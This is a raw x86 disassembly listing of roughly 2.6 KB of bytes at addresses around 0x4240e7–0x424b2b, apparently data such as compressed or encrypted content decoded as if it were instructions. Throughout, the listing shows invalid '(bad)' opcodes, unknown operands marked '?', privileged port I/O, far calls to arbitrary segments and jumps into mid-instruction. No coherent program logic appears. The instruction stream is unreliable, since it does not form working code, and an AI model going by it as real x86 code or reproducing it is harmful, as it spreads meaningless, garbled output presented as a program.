  4240e7:	sbb    cl,BYTE PTR [eax]
  4240e9:	shl    BYTE PTR [edx+0x44],cl
  4240ec:	(bad)  
  4240ed:	jnp    0x4240ef
	...
  424153:	add    BYTE PTR [eax],al
  424155:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  424159:	mov    cl,0x2e
  42415b:	idiv   edi
  42415d:	(bad)  
  42415f:	jne    0x424128
  424161:	iret   
  424162:	cdq    
  424163:	fyl2x  
  424165:	mov    dh,0x67
  424167:	add    DWORD PTR [ecx],0x0
  42416a:	add    BYTE PTR [ecx],al
  42416c:	add    BYTE PTR [eax],al
  42416e:	mov    ds,WORD PTR [edx]
  424170:	mov    ?,WORD PTR [esp+ecx*2]
  424173:	sahf   
  424174:	pushf  
  424175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424176:	jmp    0x424144
  424178:	pop    ebp
  424179:	sub    esi,DWORD PTR [ebp*8-0x484b75d9]
  424180:	(bad)  [esi+0x72]
  424183:	mov    ebp,0x72621a4c
  424188:	mov    ?,WORD PTR [esi-0x20]
  42418b:	test   al,0x4e
  42418d:	stc    
  42418e:	iret   
  42418f:	sub    al,0xed
  424191:	mov    DWORD PTR [ebx+0x10b051e9],ebx
  424197:	jnp    0x4241ef
  424199:	inc    ebp
  42419a:	lds    edx,FWORD PTR [eax-0x27]
  42419d:	dec    esi
  42419e:	in     al,dx
  42419f:	inc    eax
  4241a0:	shr    BYTE PTR [ebp+0x19353760],0x1f
  4241a7:	xor    BYTE PTR [ecx],bl
  4241a9:	imul   esp,DWORD PTR [eax-0x4d],0xffffffc3
  4241ad:	xor    al,0x74
  4241af:	jge    0x424169
  4241b1:	mov    WORD PTR [ecx-0x6e],ds
  4241b4:	pop    edi
  4241b5:	call   0x4edb:0x2a717c4f
  4241bc:	xor    BYTE PTR [ecx-0x32],bh
  4241bf:	cmp    BYTE PTR [ecx-0x56],0x52
  4241c3:	in     al,0xeb
  4241c5:	add    esp,DWORD PTR [edx+0x55a9951e]
  4241cb:	sub    bl,BYTE PTR [ebp+ebp*2+0x507ad3bd]
  4241d2:	jns    0x42421f
  4241d4:	stos   BYTE PTR es:[edi],al
  4241d5:	jae    0x424217
  4241d7:	xor    ch,ch
  4241d9:	in     eax,0xa1
  4241db:	dec    edi
  4241dc:	sub    bh,BYTE PTR [ecx-0x74f02497]
  4241e2:	repnz test eax,0x7e4d0f05
  4241e8:	push   es
  4241e9:	mov    dl,0xa3
  4241eb:	xchg   DWORD PTR [ebx+0xc],ebx
  4241ee:	call   0xe7cc:0x42517341
  4241f5:	sbb    dh,BYTE PTR [esi]
  4241f7:	push   0xffffff8e
  4241f9:	sub    bh,BYTE PTR [ebx]
  4241fb:	fs xchg esi,eax
  4241fd:	mov    esp,0x2063946
  424202:	or     ch,dl
  424204:	adc    al,0x66
  424206:	mov    dh,bl
  424208:	loope  0x424238
  42420a:	inc    eax
  42420b:	push   ds
  42420c:	adc    eax,0x810b83fe
  424211:	ins    BYTE PTR es:[edi],dx
  424212:	nop
  424213:	(bad)  
  424215:	sti    
  424216:	sbb    bl,cl
  424218:	stos   BYTE PTR es:[edi],al
  424219:	pop    ebp
  42421a:	pop    es
  42421b:	sbb    bh,dl
  42421d:	push   0x2353c204
  424222:	cmp    dh,BYTE PTR [edx]
  424224:	lock pop esi
  424226:	sbb    eax,0x43fadfe0
  42422b:	in     eax,0xc0
  42422d:	sbb    eax,0x97037e8e
  424232:	fwait
  424233:	out    dx,eax
  424234:	jp     0x4241e5
  424236:	ins    BYTE PTR es:[edi],dx
  424237:	jg     0x424214
  424239:	test   eax,0x592a1e9e
  42423e:	jne    0x424214
  424240:	imul   edi,DWORD PTR [esi],0x6
  424243:	loopne 0x42420a
  424245:	inc    eax
  424246:	pop    esp
  424247:	push   es
  424248:	and    BYTE PTR [ebx+ebx*2-0x4e],ah
  42424c:	inc    esi
  42424d:	iret   
  42424e:	and    DWORD PTR [edx-0x3d736f13],0xd71b5e8d
  424258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424259:	imul   edi,DWORD PTR [edi-0x1ddffb6],0xffffffa9
  424260:	pusha  
  424261:	adc    DWORD PTR [ebx+0x18],edi
  424264:	push   ds
  424265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424266:	mov    edx,0xcad89e72
  42426b:	push   ebx
  42426c:	test   al,0x40
	...
  4242d6:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  4242dd:	push   DWORD PTR [ecx+0x7]
  4242e0:	sub    al,0x5c
  4242e2:	pop    edi
  4242e3:	cmp    DWORD PTR [ebx-0x2b],esp
  4242e6:	test   BYTE PTR [bx+di],al
  4242e9:	add    BYTE PTR [eax],al
  4242eb:	add    DWORD PTR [eax],eax
  4242ed:	add    cl,bh
  4242ef:	mov    cl,0x9f
  4242f1:	arpl   WORD PTR [eax+0x66],si
  4242f4:	aad    0x22
  4242f6:	jmp    0x5f0620c9
  4242fb:	push   esp
  4242fc:	call   edx
  4242fe:	jnp    0x4242a4
  424300:	mov    fs,WORD PTR [ecx]
  424302:	jns    0x4242e1
  424304:	je     0x4242d0
  424306:	mov    ah,0xfd
  424308:	cli    
  424309:	iret   
  42430a:	sub    al,0x55
  42430c:	sbb    DWORD PTR ds:0x81ca3ec7,edi
  424312:	retf   0x67ed
  424315:	push   cs
  424316:	mov    bl,0xe7
  424318:	xchg   esi,eax
  424319:	repz ror DWORD PTR [ebx-0x6],cl
  42431d:	mov    ds:0x53b7be84,al
  424322:	xchg   ebx,eax
  424323:	xor    eax,0x9cb9901d
  424328:	push   ss
  424329:	dec    edx
  42432a:	hlt    
  42432b:	sub    al,0x14
  42432d:	ss out dx,eax
  42432f:	data16 mov al,0xf2
  424332:	adc    BYTE PTR [edi],ch
  424334:	push   cs
  424335:	enter  0x7ddc,0xfe
  424339:	mov    ?,ebx
  42433b:	and    eax,0xf4f9a5ba
  424340:	js     0x42435d
  424342:	mov    bl,0x8e
  424344:	or     ah,dh
  424346:	mov    al,0x3f
  424348:	(bad)  [esi-0x2e]
  42434b:	fs pop esi
  42434d:	test   al,0xda
  42434f:	lock push cs
  424351:	xrelease mov DWORD PTR [ecx+0x4f],esp
  424355:	ins    BYTE PTR es:[edi],dx
  424356:	test   al,0xfa
  424358:	mov    al,ds:0xa651800
  42435d:	cmp    esp,DWORD PTR [ecx+0x17]
  424360:	jne    0x424330
  424362:	fisttp DWORD PTR [ebx-0x23696be2]
  424368:	pop    eax
  424369:	pextrw edx,(bad),0xc5
  42436b:	push   ss
  42436c:	out    dx,al
  42436d:	addr16 mov al,0xef
  424370:	repz xchg esp,eax
  424372:	dec    ebx
  424373:	aas    
  424374:	stc    
  424375:	push   ss
  424376:	jno    0x4243e7
  424378:	adc    al,0x96
  42437a:	ret    
  42437b:	pop    edx
  42437c:	push   0x91d3dc3f
  424381:	iret   
  424382:	(bad)  
  424383:	fdivr  DWORD PTR [eax]
  424385:	repnz into 
  424387:	sbb    al,0xbf
  424389:	in     eax,dx
  42438a:	rcr    DWORD PTR [edi+0x5a],cl
  42438d:	xor    dl,BYTE PTR [ebx]
  42438f:	enter  0x66c8,0x69
  424393:	repz sar DWORD PTR [ebp+0x75535d5f],1
  42439a:	add    al,BYTE PTR [ecx+0x72130a8]
  4243a0:	outs   dx,DWORD PTR ds:[esi]
  4243a1:	js     0x42433f
  4243a3:	mov    bh,0x7d
  4243a5:	mov    esi,0xcaba7276
  4243aa:	adc    BYTE PTR [ecx],0xb3
  4243ad:	jo     0x4243c6
  4243af:	inc    edx
  4243b0:	mov    al,ds:0x14c48f98
  4243b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243b6:	scas   al,BYTE PTR es:[edi]
  4243b7:	jl     0x424433
  4243b9:	xor    eax,ecx
  4243bb:	cdq    
  4243bc:	shr    dl,cl
  4243be:	dec    edx
  4243bf:	fiadd  DWORD PTR [ebx]
  4243c1:	dec    edi
  4243c2:	sub    eax,0x29a43549
  4243c7:	aas    
  4243c8:	aas    
  4243c9:	ret    0x3c44
  4243cc:	jne    0x424378
  4243ce:	xchg   edx,eax
  4243cf:	mov    ebx,edi
  4243d1:	mov    ebx,edx
  4243d3:	imul   edx,DWORD PTR [ebx+esi*8],0x51ac16ba
  4243da:	mov    ebp,0xcabc71aa
  4243df:	out    0x0,eax
  4243e1:	add    esi,edx
  4243e3:	sub    DWORD PTR [ebp+0x5dae04e],edx
  4243e9:	inc    ebx
  4243ea:	jmp    0x1331755
	...
  424453:	add    BYTE PTR [eax],al
  424455:	add    BYTE PTR [edx-0x24582da],cl
  42445b:	sti    
  42445c:	iret   
  42445d:	ss aam 0xb
  424460:	push   ss
  424461:	jno    0x4244cb
  424463:	test   al,0x2
  424465:	and    al,0x67
  424467:	test   DWORD PTR [ecx],eax
  424469:	add    BYTE PTR [eax],al
  42446b:	add    DWORD PTR [eax],eax
  42446d:	add    BYTE PTR [esi],dl
  42446f:	imul   BYTE PTR [ecx+ebx*1-0x15]
  424473:	mov    ebx,DWORD PTR [edx-0x32]
  424476:	imul   ecx,ecx,0xb44af911
  42447c:	xchg   BYTE PTR [esi+0x4a1b4520],ah
  424482:	sub    DWORD PTR [ebx],esp
  424484:	xchg   ecx,eax
  424485:	push   cs
  424486:	jo     0x424426
  424488:	lahf   
  424489:	sbb    DWORD PTR [ecx+0x253f3647],esi
  42448f:	aaa    
  424490:	sbb    BYTE PTR [edi+0x5cbb57ef],cl
  424496:	jmp    0x4244b1
  424498:	(bad)  
  424499:	xchg   esi,eax
  42449a:	aad    0x6
  42449c:	sahf   
  42449d:	xchg   esi,eax
  42449e:	imul   eax,edx,0xffffffff
  4244a1:	shr    DWORD PTR [ebp+0x48],0x8
  4244a5:	rcr    DWORD PTR ss:[edi+ebp*1+0x75],0x2c
  4244ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244ac:	imul   ebx,DWORD PTR [ebp-0x6e],0x3
  4244b0:	pop    DWORD PTR [esi]
  4244b2:	sub    al,0x8e
  4244b4:	jp     0x4244e8
  4244b6:	fsub   QWORD PTR [ebp-0x1b65adff]
  4244bc:	sub    BYTE PTR [ebx],ah
  4244be:	and    BYTE PTR [eax],0xfb
  4244c1:	inc    edx
  4244c2:	nop    DWORD PTR [eax-0x79d4680d]
  4244c9:	mov    dl,0xe8
  4244cb:	cld    
  4244cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4244cd:	arpl   WORD PTR [ebx],bp
  4244cf:	jb     0x42449b
  4244d1:	sbb    ah,BYTE PTR [edi]
  4244d3:	sbb    bh,cl
  4244d5:	push   es
  4244d6:	dec    ebx
  4244d7:	fwait
  4244d8:	scas   eax,DWORD PTR es:[edi]
  4244d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244da:	xor    BYTE PTR [edi],bl
  4244dc:	xor    eax,0x1d44fdf7
  4244e1:	jno    0x4244d0
  4244e3:	push   edx
  4244e4:	mov    dl,0xef
  4244e6:	push   cs
  4244e7:	mov    al,0xf1
  4244e9:	test   BYTE PTR [ecx],cl
  4244eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244ec:	fstp   QWORD PTR [edx]
  4244ee:	jae    0x4244e2
  4244f0:	ins    BYTE PTR es:[edi],dx
  4244f1:	cmc    
  4244f2:	jp     0x42448c
  4244f4:	jg     0x424564
  4244f6:	cmp    ecx,DWORD PTR [eax+edi*8+0x44]
  4244fa:	pop    esi
  4244fb:	mov    bh,0x6a
  4244fd:	(bad)  
  4244fe:	fdivr  QWORD PTR [esi*2-0x3913b63a]
  424505:	ins    DWORD PTR es:[edi],dx
  424506:	test   edi,edx
  424508:	shl    ebp,0x62
  42450b:	xchg   esi,eax
  42450c:	and    eax,0x36ed86c5
  424511:	test   BYTE PTR [ebp+0x78],dh
  424514:	pop    ebp
  424515:	pop    eax
  424516:	dec    ebx
  424517:	or     al,0xdc
  424519:	lock mov esi,0x1fcb06f2
  42451f:	aam    0x7a
  424521:	stc    
  424522:	in     al,dx
  424523:	out    dx,eax
  424524:	cdq    
  424525:	loop   0x4244cb
  424527:	cmc    
  424528:	daa    
  424529:	pop    esi
  42452a:	sbb    ah,BYTE PTR [ecx+0x209cd3ca]
  424530:	dec    esp
  424531:	pusha  
  424532:	fist   WORD PTR [ecx-0x6e7baa59]
  424538:	mov    esp,0x45610f2e
  42453d:	push   ebp
  42453e:	rcl    BYTE PTR [eax],1
  424540:	sar    ecx,cl
  424542:	(bad)  
  424543:	test   BYTE PTR [edx-0x2b5f56ad],0x41
  42454a:	jge    0x424502
  42454c:	pop    ss
  42454d:	repnz xor ch,BYTE PTR [edi+0x68]
  424551:	pop    ss
  424552:	mov    esi,DWORD PTR [eax+eiz*8]
  424555:	jmp    DWORD PTR ds:0xcc28d997
  42455b:	jno    0x4244e4
  42455d:	leave  
  42455e:	push   ecx
  42455f:	ret    0xefe9
  424562:	sbb    BYTE PTR [ebp-0x6e],0xb7
  424566:	cwde   
  424567:	pop    ebx
  424568:	fsub   st(1),st
  42456a:	jle    0x4245aa
  42456c:	int    0x83
	...
  4245d6:	loopne 0x424647
  4245d8:	xchg   esi,eax
  4245d9:	inc    edx
  4245da:	lahf   
  4245db:	sti    
  4245dc:	hlt    
  4245dd:	out    dx,eax
  4245de:	dec    eax
  4245df:	rol    DWORD PTR [esp+ebx*4-0x4d],1
  4245e3:	fwait
  4245e4:	mov    al,ds:0x186671f
  4245e9:	add    BYTE PTR [eax],al
  4245eb:	add    DWORD PTR [eax],eax
  4245ed:	add    BYTE PTR [ebp+0x3d5a5a7e],cl
  4245f3:	and    al,0xe1
  4245f5:	push   es
  4245f6:	xor    eax,0x800cac9d
  4245fb:	repz mov esi,0x2b54acf2
  424601:	stos   BYTE PTR es:[edi],al
  424602:	pop    ss
  424603:	push   edi
  424604:	(bad)  
  424605:	push   edi
  424606:	jl     0x4245ba
  424608:	pop    es
  424609:	xor    DWORD PTR [eax+eax*4-0x7e],0x9a6e1969
  424611:	data16 (bad) 
  424614:	jbe    0x4245f5
  424616:	dec    ebp
  424617:	add    dl,BYTE PTR ds:0x8963439c
  42461d:	mov    bl,0xa9
  42461f:	popf   
  424620:	or     al,BYTE PTR [esi+edx*2]
  424623:	iret   
  424624:	jo     0x4245cc
  424626:	mov    ds:0x29fb97bf,al
  42462b:	jae    0x424698
  42462d:	and    BYTE PTR [edx+0x5f],al
  424630:	adc    edx,DWORD PTR [edi]
  424632:	dec    edx
  424633:	bound  ecx,QWORD PTR [ecx+eiz*8]
  424636:	mov    ah,0x6b
  424638:	jge    0x424649
  42463a:	bound  ebp,QWORD PTR [ebp+0x7f]
  42463d:	pop    ds
  42463e:	fcomip st,st(5)
  424640:	in     eax,dx
  424641:	fsubr  QWORD PTR [ebx+0x3fadddd3]
  424647:	dec    esp
  424648:	cmp    al,0xf3
  42464a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42464b:	hlt    
  42464c:	in     eax,0xaa
  42464e:	shl    DWORD PTR [ecx],1
  424650:	cmp    edx,0x90f4bfa6
  424656:	sub    BYTE PTR [edi+0x4d507ec],al
  42465c:	adc    eax,0xe6211176
  424661:	xchg   esi,eax
  424662:	fwait
  424663:	jns    0x4246b4
  424665:	pop    edi
  424666:	mov    ds:0x869ba142,eax
  42466b:	ins    BYTE PTR es:[edi],dx
  42466c:	pop    esi
  42466d:	xor    eax,0x4c64007c
  424672:	out    dx,al
  424673:	xor    ebp,DWORD PTR [esi+0x53]
  424676:	push   ebx
  424677:	mov    ecx,0xaa908924
  42467c:	mov    ds:0x4f3642,eax
  424681:	mov    ds:0x7272676c,eax
  424686:	popa   
  424687:	add    edx,DWORD PTR [ecx-0x6abade44]
  42468d:	jno    0x4246c1
  42468f:	mov    ebp,0xc5dd5a64
  424694:	(bad)  
  424695:	pushf  
  424696:	jbe    0x4246be
  424698:	push   ecx
  424699:	and    al,0x87
  42469b:	mov    bl,0xbc
  42469d:	shr    esi,1
  42469f:	pushf  
  4246a0:	iret   
  4246a1:	pop    edx
  4246a2:	mov    WORD PTR [edi],gs
  4246a4:	fs mov cs,WORD PTR fs:[edi+ebx*2]
  4246a9:	fsubrp st(7),st
  4246ab:	jle    0x4246ee
  4246ad:	or     eax,DWORD PTR ds:0x9b9c6614
  4246b3:	pop    ebp
  4246b4:	xchg   esp,eax
  4246b5:	pop    es
  4246b6:	and    al,al
  4246b8:	push   esi
  4246b9:	test   BYTE PTR [eax+0x113b9068],cl
  4246bf:	add    ch,BYTE PTR [esi-0x3d07928e]
  4246c5:	cli    
  4246c6:	jp     0x42466e
  4246c8:	out    0x4d,al
  4246ca:	mov    ebp,0x342321a4
  4246cf:	jp     0x4246c3
  4246d1:	pop    es
  4246d2:	and    ecx,0xd042d24d
  4246d8:	ins    BYTE PTR es:[edi],dx
  4246d9:	mov    esp,0x6497a680
  4246de:	mov    esi,ss
  4246e0:	push   ebx
  4246e1:	icebp  
  4246e2:	lahf   
  4246e3:	push   ds
  4246e4:	std    
  4246e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4246e6:	jae    0x424696
  4246e8:	fcomip st,st(7)
  4246ea:	jbe    0x4246e6
  4246ec:	xor    eax,0xf7
	...
  424755:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42475c:	mov    edi,0xb298dbd3
  424761:	mov    BYTE PTR [edx],bl
  424763:	push   edi
  424764:	xlat   BYTE PTR ds:[ebx]
  424765:	clc    
  424766:	xchg   DWORD PTR [bx+di],eax
  424769:	add    BYTE PTR [eax],al
  42476b:	add    DWORD PTR [eax],eax
  42476d:	add    BYTE PTR [eax],dh
  42476f:	out    0x96,eax
  424771:	arpl   WORD PTR [ebx],di
  424773:	(bad)  
  424774:	and    bh,bh
  424776:	movsx  eax,BYTE PTR [eax-0x73]
  42477a:	inc    ecx
  42477b:	int    0xd8
  42477d:	xor    DWORD PTR [edi+esi*8],edi
  424780:	inc    eax
  424781:	lea    ebp,[ebp-0x28]
  424784:	add    DWORD PTR [esi+0x4a91a747],esi
  42478a:	pop    ecx
  42478b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42478c:	addr16 sahf 
  42478e:	mov    es,ebp
  424790:	mov    cl,0xf2
  424792:	xor    bl,cl
  424794:	xor    al,0x43
  424796:	mov    ds:0x68a7377a,al
  42479b:	or     BYTE PTR [ebp-0x16],0xab
  42479f:	sub    dl,BYTE PTR [ecx+0x66c15e4e]
  4247a5:	popf   
  4247a6:	add    bl,ah
  4247a8:	(bad)  
  4247a9:	hlt    
  4247aa:	dec    esi
  4247ab:	jp     0x4247cc
  4247ad:	fisttp WORD PTR [ecx-0x72525ce8]
  4247b3:	or     eax,0xda12c296
  4247b8:	cmp    eax,eax
  4247ba:	repnz push ecx
  4247bc:	test   al,0xf5
  4247be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247bf:	mov    ah,cl
  4247c1:	dec    ecx
  4247c2:	add    DWORD PTR [edi-0x719242a4],edx
  4247c8:	imul   ebx,esp,0xa
  4247cb:	mov    cl,bl
  4247cd:	daa    
  4247ce:	rcr    dh,0xe9
  4247d1:	int    0xee
  4247d3:	inc    edx
  4247d4:	call   0x80a77c73
  4247d9:	stos   DWORD PTR es:[edi],eax
  4247da:	jns    0x4247c1
  4247dc:	outs   dx,BYTE PTR ds:[esi]
  4247dd:	xchg   al,cl
  4247df:	leave  
  4247e0:	clc    
  4247e1:	dec    ebp
  4247e2:	cmp    cl,ah
  4247e4:	fisttp DWORD PTR [bx+di+0x7608]
  4247e9:	mov    WORD PTR [eax+edi*8+0x51ba12f6],fs
  4247f0:	mov    dh,0xe4
  4247f2:	sbb    ch,bl
  4247f4:	jecxz  0x424810
  4247f6:	adc    eax,0xf0037037
  4247fb:	jnp    0x424863
  4247fd:	mov    cl,0x68
  4247ff:	jno    0x4247bb
  424801:	into   
  424802:	cmp    eax,0xc8ba2241
  424807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424808:	sbb    ecx,ecx
  42480a:	ins    DWORD PTR es:[edi],dx
  42480b:	arpl   WORD PTR [esi],dx
  42480d:	add    al,0x24
  42480f:	fsub   QWORD PTR [esp+edi*1+0x25]
  424813:	sti    
  424814:	dec    eax
  424815:	jmp    0x4247b9
  424817:	daa    
  424818:	in     al,dx
  424819:	outs   dx,DWORD PTR ds:[esi]
  42481a:	scas   al,BYTE PTR es:[edi]
  42481b:	int    0xc5
  42481d:	int    0x77
  42481f:	xchg   edi,eax
  424820:	imul   esp,DWORD PTR [ebp+ebp*2+0x70],0xf20c4d3b
  424828:	inc    edx
  424829:	jae    0x4247e2
  42482b:	ins    BYTE PTR es:[edi],dx
  42482c:	fnstcw WORD PTR [edi+0x959eeb4]
  424832:	jae    0x424806
  424834:	push   eax
  424835:	xchg   edx,eax
  424836:	les    esp,FWORD PTR [edx-0x30]
  424839:	and    esi,0xe7688a50
  42483f:	popa   
  424840:	jle    0x42487f
  424842:	mov    ch,0x19
  424844:	pop    ebp
  424845:	imul   ebp,DWORD PTR [edx],0xfffffff5
  424848:	inc    ecx
  424849:	mov    BYTE PTR [ebx+ebx*1-0x76],dh
  42484d:	sub    edx,DWORD PTR [ecx+0x47]
  424850:	sbb    esi,DWORD PTR ds:0x3dd552a1
  424856:	or     DWORD PTR [edi],0xe86448b
  42485c:	cmp    eax,0x6ae73b57
  424861:	inc    ecx
  424862:	push   ecx
  424863:	sbb    eax,ebp
  424865:	ret    0x4294
  424868:	add    al,0x2d
  42486a:	shl    BYTE PTR [edx],cl
  42486c:	inc    ecx
  42486d:	fadd   DWORD PTR [eax]
	...
  4248d3:	add    BYTE PTR [eax],al
  4248d5:	add    BYTE PTR [edx],ah
  4248d7:	pop    eax
  4248d8:	test   bh,ch
  4248da:	(bad)  
  4248db:	jmp    FWORD PTR [ebx-0x23]
  4248de:	lock test BYTE PTR [ebx],dl
  4248e1:	xchg   esp,eax
  4248e2:	fdiv   st,st(3)
  4248e4:	or     ch,BYTE PTR [ebx+0x67]
  4248e7:	mov    BYTE PTR [ecx],al
  4248e9:	add    BYTE PTR [eax],al
  4248eb:	add    DWORD PTR [eax],eax
  4248ed:	add    BYTE PTR [esi+0x226bfcfc],al
  4248f3:	jno    0x4248c8
  4248f5:	(bad)  
  4248f6:	mov    bl,0xbc
  4248f8:	xor    bh,BYTE PTR [esi]
  4248fa:	daa    
  4248fb:	xor    dh,al
  4248fd:	adc    eax,0xe384f470
  424902:	inc    eax
  424903:	clc    
  424904:	das    
  424905:	inc    ecx
  424906:	icebp  
  424907:	lods   eax,DWORD PTR ds:[esi]
  424908:	jno    0x424959
  42490a:	add    al,0xf1
  42490c:	call   0x75ea:0xb9b18bdf
  424913:	es and eax,0xb9a72b64
  424919:	pop    ebx
  42491a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42491b:	dec    ebx
  42491c:	jg     0x4248c3
  42491e:	xor    BYTE PTR [ebp+eax*2+0x43],dh
  424922:	out    dx,eax
  424923:	sti    
  424924:	adc    eax,0x2a7b0f57
  424929:	xchg   BYTE PTR [ebp-0x3e91642a],bl
  42492f:	sahf   
  424930:	xor    dl,BYTE PTR [esi+ebx*1-0x37]
  424934:	rcl    eax,1
  424936:	push   cs
  424937:	mov    ch,0xfa
  424939:	sahf   
  42493a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42493b:	jns    0x424923
  42493d:	test   eax,0x3c826c11
  424942:	jg     0x424982
  424944:	cs adc al,0x9a
  424947:	out    dx,al
  424948:	and    al,0x1
  42494a:	popa   
  42494b:	aad    0x21
  42494d:	stc    
  42494e:	outs   dx,DWORD PTR ds:[esi]
  42494f:	mov    ecx,0x74689e2c
  424954:	adc    DWORD PTR [esi+0x69],esp
  424957:	inc    edx
  424958:	fcmovnu st,st(1)
  42495a:	fs out 0xa,al
  42495d:	pop    ss
  42495e:	(bad)  
  42495f:	mov    dl,0x6c
  424961:	in     al,dx
  424962:	inc    esp
  424963:	mov    ecx,?
  424965:	sbb    dl,bl
  424967:	mov    cs,eax
  424969:	jecxz  0x424995
  42496b:	jp     0x424962
  42496d:	and    ebp,DWORD PTR [esi]
  42496f:	jecxz  0x4249d5
  424971:	xor    eax,0x96e2bc0c
  424976:	lds    esi,FWORD PTR [edx]
  424978:	psadbw mm0,QWORD PTR [eax-0x3]
  42497c:	mov    ecx,0xf430a54
  424981:	mov    edi,0x4f4e205d
  424986:	not    BYTE PTR [edi+0x14b9020f]
  42498c:	sub    ah,ah
  42498e:	stos   BYTE PTR es:[edi],al
  42498f:	ins    BYTE PTR es:[edi],dx
  424990:	ror    al,cl
  424992:	(bad)  
  424993:	mov    ebp,0x53f050cf
  424998:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424999:	pop    ds
  42499a:	fist   WORD PTR [ebx-0x5d]
  42499d:	(bad)  [ebp-0x12c2a236]
  4249a3:	jmp    0x42499a
  4249a5:	fxch   st(7)
  4249a7:	pop    es
  4249a8:	or     DWORD PTR [esi],0xb4dd34b7
  4249ae:	loope  0x424968
  4249b0:	test   DWORD PTR [ebx+0x68],ebx
  4249b3:	js     0x424975
  4249b5:	ret    0xb807
  4249b8:	dec    edi
  4249b9:	das    
  4249ba:	mov    edx,0x7e0a82ba
  4249bf:	lds    ebp,FWORD PTR [ebp+0x5f05ab7]
  4249c5:	sbb    al,0xfc
  4249c7:	jg     0x424965
  4249c9:	sub    bh,al
  4249cb:	push   ss
  4249cc:	fwait
  4249cd:	les    edx,FWORD PTR [ebx-0x6e7ed847]
  4249d3:	jmp    0x841d36a9
  4249d8:	sahf   
  4249d9:	into   
  4249da:	stos   DWORD PTR es:[edi],eax
  4249db:	repz inc esi
  4249dd:	out    dx,al
  4249de:	or     al,0xe
  4249e0:	jp     0x4249be
  4249e2:	or     esp,DWORD PTR [eax+0x1a63094e]
  4249e8:	fndisi(8087 only) 
  4249ea:	pop    ecx
  4249eb:	mov    BYTE PTR [edx+0x69],0x0
	...
  424a56:	imul   ebx,DWORD PTR [eax],0x63
  424a59:	push   0x73
  424a5b:	jnp    0x424ac8
  424a5d:	sbb    DWORD PTR [eax-0x5c],ecx
  424a60:	push   esi
  424a61:	xor    bl,BYTE PTR [edi+0x14]
  424a64:	push   ss
  424a65:	aam    0x67
  424a67:	mov    DWORD PTR [ecx],eax
  424a69:	add    BYTE PTR [eax],al
  424a6b:	add    DWORD PTR [eax],eax
  424a6d:	add    al,bl
  424a6f:	push   ecx
  424a70:	sbb    dh,BYTE PTR [ebx+ebp*4+0x3f]
  424a74:	repnz inc esi
  424a76:	jg     0x424a0d
  424a78:	es adc al,0x98
  424a7b:	sub    DWORD PTR [ecx-0x34a62517],ebx
  424a81:	cmp    al,0xe0
  424a83:	jo     0x424a95
  424a85:	das    
  424a86:	xchg   ch,dh
  424a88:	clc    
  424a89:	nop
  424a8a:	xlat   BYTE PTR ds:[ebx]
  424a8b:	jge    0x424a27
  424a8d:	aaa    
  424a8e:	push   eax
  424a8f:	xlat   BYTE PTR gs:[ebx]
  424a91:	cdq    
  424a92:	jne    0x424a16
  424a94:	les    edi,FWORD PTR [eax-0x4c8c350]
  424a9a:	pop    ebx
  424a9b:	xor    DWORD PTR [esi+ecx*8],edx
  424a9e:	pop    edi
  424a9f:	inc    edi
  424aa0:	daa    
  424aa1:	imul   cl
  424aa3:	(bad)  
  424aa5:	add    bl,al
  424aa7:	push   edi
  424aa8:	ss and eax,0xc9619831
  424aae:	xchg   ebx,eax
  424aaf:	xchg   edx,eax
  424ab0:	mov    cl,0xca
  424ab2:	sub    ebx,DWORD PTR [edx-0x20d3c5fb]
  424ab8:	lods   al,BYTE PTR ds:[esi]
  424ab9:	jmp    0x424af5
  424abb:	sbb    dl,BYTE PTR [edi+0xa]
  424abe:	jbe    0x424a4c
  424ac0:	outs   dx,DWORD PTR ds:[esi]
  424ac1:	icebp  
  424ac2:	sbb    BYTE PTR [ecx+0x50ed0a93],bl
  424ac8:	lea    ecx,[edi+edx*8+0x51]
  424acc:	pop    ss
  424acd:	push   0xffffff96
  424acf:	jbe    0x424ae1
  424ad1:	lods   eax,DWORD PTR ds:[esi]
  424ad2:	push   edi
  424ad3:	ds pop ss
  424ad5:	mov    esp,0x3b2e22aa
  424ada:	daa    
  424adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424adc:	adc    ah,dl
  424ade:	fiadd  DWORD PTR [esi-0x6c]
  424ae1:	leave  
  424ae2:	dec    ebp
  424ae3:	fs je  0x424b52
  424ae6:	dec    ecx
  424ae7:	nop
  424ae8:	lahf   
  424ae9:	mov    bh,ah
  424aeb:	mov    al,0xd8
  424aed:	(bad)  
  424aee:	fld    TBYTE PTR [esi+eiz*8]
  424af1:	xchg   edx,eax
  424af2:	out    0x5a,eax
  424af4:	push   eax
  424af5:	mov    ecx,0x9a14dabb
  424afa:	inc    eax
  424afb:	jl     0x424b64
  424afd:	(bad)  
  424afe:	push   esp
  424aff:	test   DWORD PTR [ecx+0xf],0xa6520c4b
  424b06:	mov    edx,0xba2f05ec
  424b0b:	out    0xa9,eax
  424b0d:	pushf  
  424b0e:	loop   0x424a93
  424b10:	daa    
  424b11:	adc    eax,0x7a222638
  424b16:	adc    eax,0x97704294
  424b1b:	cld    
  424b1c:	push   edi
  424b1d:	ins    DWORD PTR es:[edi],dx
  424b1e:	mov    al,0xf4
  424b20:	sbb    al,0xbf
  424b22:	and    ebp,edx
  424b24:	and    eax,DWORD PTR [ecx+eiz*2]
  424b27:	popa   
  424b28:	ins    DWORD PTR es:[edi],dx
  424b29:	ja     0x424b98
  424b2b:	cmp    dh,BYTE PTR [edx-0xe36cc07]
